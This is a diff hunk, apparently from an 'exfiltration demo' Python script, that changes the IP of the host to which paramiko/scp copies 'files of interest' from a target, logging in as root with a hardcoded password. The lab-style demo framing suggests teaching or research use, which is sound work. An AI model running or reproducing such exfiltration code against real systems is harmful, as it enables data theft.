@@ -272,7 +272,7 @@ while True:
                         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                         #  For exfiltration demo to work, you must provide an IP address and the login 
                         #  credentials in the next statement:
-                        ssh.connect('172.17.0.11',port=22,username='root',password='mypassword',timeout=5)
+                        ssh.connect('172.17.0.2',port=22,username='root',password='mypassword',timeout=5)
                         scpcon = scp.SCPClient(ssh.get_transport())
                         print("\nConnected to exhiltration host\n")
                         for filename in files_of_interest_at_target:
